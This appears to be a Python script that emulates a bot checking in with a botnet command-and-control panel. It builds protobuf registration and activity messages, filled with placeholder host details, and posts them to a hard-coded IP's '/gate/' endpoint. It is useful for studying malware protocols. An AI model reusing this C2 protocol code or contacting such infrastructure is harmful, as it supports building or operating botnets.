import requests
import bot_pb2
import struct
from io import StringIO

bot = bot_pb2.BotMsg.RegisterBot()
bot.uid = 'zxcvbnm1'.encode('utf-16-le')
bot.computername = '12dczczc3'.encode('utf-16-le')
bot.username = '1232czc3'.encode('utf-16-le')
bot.os_major = 6
bot.os_minor = 3
bot.is_x64 = True
bot.is_server = False
#r = requests.post(url='http://185.250.151.137:80/gate/', data='1'.encode('utf-8'))
r = requests.post(url='http://185.250.151.137:80/gate/', data=struct.pack('=I', 1) + bot.SerializeToString())

print(r.text, 'text')
_r = bot_pb2.PanelMsg.RegistrationResult()
_r.ParseFromString(r.content)
print(_r)


ar = bot_pb2.BotMsg.ActivityReport()
ar.uid = 'c625b27815bb8a0fa14699d262f752d6'.encode('utf-16-le')

r1 = requests.post(url='http://185.250.151.137:80/gate/', data=struct.pack('=I', 2) + ar.SerializeToString())
print(r1.text)
